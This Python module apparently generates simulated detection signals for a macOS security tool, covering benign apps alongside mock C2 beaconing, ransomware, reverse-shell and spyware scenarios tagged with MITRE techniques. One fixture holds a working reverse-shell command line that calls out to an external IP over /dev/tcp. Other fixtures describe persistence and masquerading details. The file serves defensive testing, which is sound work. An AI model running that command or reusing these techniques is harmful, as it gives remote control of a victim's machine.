from __future__ import annotations
from typing import Literal
from aegis.models.signal import Signal, Category, Severity, MITRETactic
from aegis.models.entity import Entity

AttackScenarioType = Literal[
    "apt29_covert_c2",
    "blackcat_ransomware",
    "pegasus_spyware",
    "reverse_shell_rce",
    "enterprise_baseline",
    "all_threats"
]


def generate_scenario_signals(scenario: AttackScenarioType = "all_threats") -> list[Signal]:
    signals: list[Signal] = []

    # 1. Baseline Benign Applications (Always present)
    zoom_app = Entity(
        type="process",
        id="1042:/Applications/zoom.us.app/Contents/MacOS/zoom.us",
        name="zoom.us",
        pid=1042,
        parent_pid=1,
        path="/Applications/zoom.us.app/Contents/MacOS/zoom.us",
    )
    vscode_app = Entity(
        type="process",
        id="2188:/Applications/Visual Studio Code.app/Contents/MacOS/Electron",
        name="Code Helper",
        pid=2188,
        parent_pid=1,
        path="/Applications/Visual Studio Code.app",
    )

    signals.extend([
        Signal(
            id="sig_zoom_cam", category=Category.PRIVACY, source_check="privacy_sensor_monitor",
            severity=Severity.LOW, confidence=0.95, entity=zoom_app,
            description="Active camera/audio hardware access authorized by user",
            mitre_tactic=MITRETactic.COLLECTION, mitre_technique="T1125: Video Capture",
            metadata={"cam_mic": True, "authorized": True},
        ),
        Signal(
            id="sig_zoom_sign", category=Category.APPLICATION, source_check="codesign_verifier",
            severity=Severity.INFO, confidence=1.0, entity=zoom_app,
            description="Apple Developer ID signed: Zoom Video Communications, Inc. (Valid)",
            metadata={"signed": True, "publisher": "Zoom Video Communications, Inc."},
        ),
        Signal(
            id="sig_zoom_patch", category=Category.VULNERABILITY, source_check="cve_vulnerability_scanner",
            severity=Severity.LOW, confidence=1.0, entity=zoom_app,
            description="Update available: 5.16.2 -> 5.17.0 (Non-critical bugfix)",
            metadata={"update_available": True},
        ),
        Signal(
            id="sig_vscode_sign", category=Category.APPLICATION, source_check="codesign_verifier",
            severity=Severity.INFO, confidence=1.0, entity=vscode_app,
            description="Apple Developer ID signed: Microsoft Corporation (Valid)",
            metadata={"signed": True, "publisher": "Microsoft Corporation"},
        ),
    ])

    # 2. APT-29 Covert C2 Beaconing Scenario
    if scenario in ["apt29_covert_c2", "all_threats"]:
        c2_entity = Entity(
            type="process",
            id="4920:/tmp/.kernel_cache/svchost_updater.bin",
            name="svchost_updater.bin",
            pid=4920,
            parent_pid=1,
            path="/tmp/.kernel_cache/svchost_updater.bin",
            cmdline="/tmp/.kernel_cache/svchost_updater.bin --daemon --silent",
        )
        signals.extend([
            Signal(
                id="sig_c2_persist", category=Category.PERSISTENCE, source_check="launch_agent_monitor",
                severity=Severity.HIGH, confidence=0.92, entity=c2_entity,
                description="Persisted via LaunchAgent: ~/Library/LaunchAgents/com.apple.updater.cache.plist",
                mitre_tactic=MITRETactic.PERSISTENCE, mitre_technique="T1547: Boot or Logon Autostart Execution",
                metadata={"persistence": True},
            ),
            Signal(
                id="sig_c2_net", category=Category.NETWORK, source_check="socket_sentinel",
                severity=Severity.CRITICAL, confidence=0.96, entity=c2_entity,
                description="Periodic beaconing to Russian/Tor-exit IP 185.220.101.5:4444 (Beacon interval: 30s)",
                mitre_tactic=MITRETactic.COMMAND_AND_CONTROL, mitre_technique="T1071: Application Layer Protocol (C2)",
                metadata={"c2_candidate": True, "external_connection": True, "remote_ip": "185.220.101.5", "remote_port": 4444},
            ),
            Signal(
                id="sig_c2_unsigned", category=Category.APPLICATION, source_check="codesign_verifier",
                severity=Severity.HIGH, confidence=1.0, entity=c2_entity,
                description="Binary is unsigned and packed with UPX compressor",
                mitre_tactic=MITRETactic.DEFENSE_EVASION, mitre_technique="T1027: Obfuscated Files",
                metadata={"signed": False, "packed": True},
            ),
            Signal(
                id="sig_c2_masq", category=Category.PROCESS, source_check="masquerade_detector",
                severity=Severity.HIGH, confidence=0.88, entity=c2_entity,
                description="Spoofed Windows/macOS system process name executing from /tmp directory",
                mitre_tactic=MITRETactic.DEFENSE_EVASION, mitre_technique="T1036: Masquerading",
                metadata={"masquerading": True, "suspicious_location": True},
            ),
        ])

    # 3. BlackCat / Ransomware Preflight Scenario
    if scenario in ["blackcat_ransomware", "all_threats"]:
        ransom_entity = Entity(
            type="process",
            id="7119:/Users/Apple/Downloads/invoice_pdf_view.exe",
            name="invoice_pdf_view.exe",
            pid=7119,
            parent_pid=301,
            path="/Users/Apple/Downloads/invoice_pdf_view.exe",
            cmdline="./invoice_pdf_view.exe -enc --threads=16",
        )
        signals.extend([
            Signal(
                id="sig_ransom_entropy", category=Category.PROCESS, source_check="entropy_monitor",
                severity=Severity.CRITICAL, confidence=0.95, entity=ransom_entity,
                description="High entropy file modifications detected across ~/Documents (>45 files/sec)",
                mitre_tactic=MITRETactic.IMPACT, mitre_technique="T1486: Data Encrypted for Impact",
                metadata={"high_entropy_writes": True, "canary_tripped": True},
            ),
            Signal(
                id="sig_ransom_unsigned", category=Category.APPLICATION, source_check="codesign_verifier",
                severity=Severity.HIGH, confidence=1.0, entity=ransom_entity,
                description="Untrusted binary with double extension masquerading as PDF",
                mitre_tactic=MITRETactic.DEFENSE_EVASION, mitre_technique="T1036.007: Double File Extension",
                metadata={"signed": False},
            ),
            Signal(
                id="sig_ransom_shadow", category=Category.INTEGRITY, source_check="system_backup_guard",
                severity=Severity.HIGH, confidence=0.90, entity=ransom_entity,
                description="Attempted invocation to disable Time Machine / VSS backups",
                mitre_tactic=MITRETactic.IMPACT, mitre_technique="T1489: Service Stop",
                metadata={"backup_tampering": True},
            ),
        ])

    # 4. Interactive Reverse Shell RCE Scenario
    if scenario in ["reverse_shell_rce", "all_threats"]:
        rev_shell_entity = Entity(
            type="process",
            id="8344:/bin/zsh",
            name="zsh",
            pid=8344,
            parent_pid=5020,
            path="/bin/zsh",
            cmdline="/bin/zsh -i >& /dev/tcp/91.132.90.11/1337 0>&1",
        )
        signals.extend([
            Signal(
                id="sig_rev_cmd", category=Category.PROCESS, source_check="lineage_tracker",
                severity=Severity.CRITICAL, confidence=0.99, entity=rev_shell_entity,
                description="Interactive shell spawned by python3 web worker with redirected stdin/stdout sockets",
                mitre_tactic=MITRETactic.EXECUTION, mitre_technique="T1059.004: Unix Shell",
                metadata={"reverse_shell": True, "unusual_parent": True},
            ),
            Signal(
                id="sig_rev_socket", category=Category.NETWORK, source_check="socket_sentinel",
                severity=Severity.CRITICAL, confidence=0.97, entity=rev_shell_entity,
                description="Outbound TCP connection established to 91.132.90.11:1337",
                mitre_tactic=MITRETactic.COMMAND_AND_CONTROL, mitre_technique="T1571: Non-Standard Port Communication",
                metadata={"external_connection": True, "remote_ip": "91.132.90.11", "remote_port": 1337},
            ),
        ])

    # 5. Stealth Spyware / Surveillance Scenario
    if scenario in ["pegasus_spyware"]:
        spy_entity = Entity(
            type="process",
            id="6205:/Library/Caches/com.apple.audio.hook",
            name="com.apple.audio.hook",
            pid=6205,
            parent_pid=1,
            path="/Library/Caches/com.apple.audio.hook",
        )
        signals.extend([
            Signal(
                id="sig_spy_screen", category=Category.PRIVACY, source_check="privacy_sensor_monitor",
                severity=Severity.HIGH, confidence=0.91, entity=spy_entity,
                description="Background process holds unauthorized CoreGraphics screen capture stream",
                mitre_tactic=MITRETactic.COLLECTION, mitre_technique="T1113: Screen Capture",
                metadata={"screen_capture": True},
            ),
            Signal(
                id="sig_spy_key", category=Category.PRIVACY, source_check="input_tap_sentinel",
                severity=Severity.HIGH, confidence=0.89, entity=spy_entity,
                description="Active CGEventTap keyboard input interception registered",
                mitre_tactic=MITRETactic.COLLECTION, mitre_technique="T1056: Input Capture",
                metadata={"keylogging": True},
            ),
            Signal(
                id="sig_spy_unsigned", category=Category.APPLICATION, source_check="codesign_verifier",
                severity=Severity.HIGH, confidence=1.0, entity=spy_entity,
                description="Binary is unsigned and masquerading in system Library caches",
                mitre_tactic=MITRETactic.DEFENSE_EVASION, mitre_technique="T1036: Masquerading",
                metadata={"signed": False},
            ),
        ])

    return signals
